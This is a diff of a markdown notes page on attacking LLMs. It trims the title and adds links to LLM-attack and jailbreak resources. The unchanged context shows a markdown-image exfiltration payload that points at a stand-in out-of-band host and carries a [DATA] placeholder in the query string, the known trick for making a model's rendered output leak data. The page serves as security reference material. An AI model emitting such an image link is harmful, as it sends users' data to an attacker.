@@ -1,5 +1,5 @@
 +++
-title = 'LLMs   '
+title = 'LLMs'
 +++
 
 ## Unfiltered LLMs
@@ -58,3 +58,8 @@ text at the very beginning of the response, so the user has the correct context.
 
 ![TEXT](https://oob.tld/logo.png?goog=[DATA])
 ```
+
+## Articles
+
+- https://portswigger.net/web-security/llm-attacks
+- https://doublespeak.chat/#/handbook
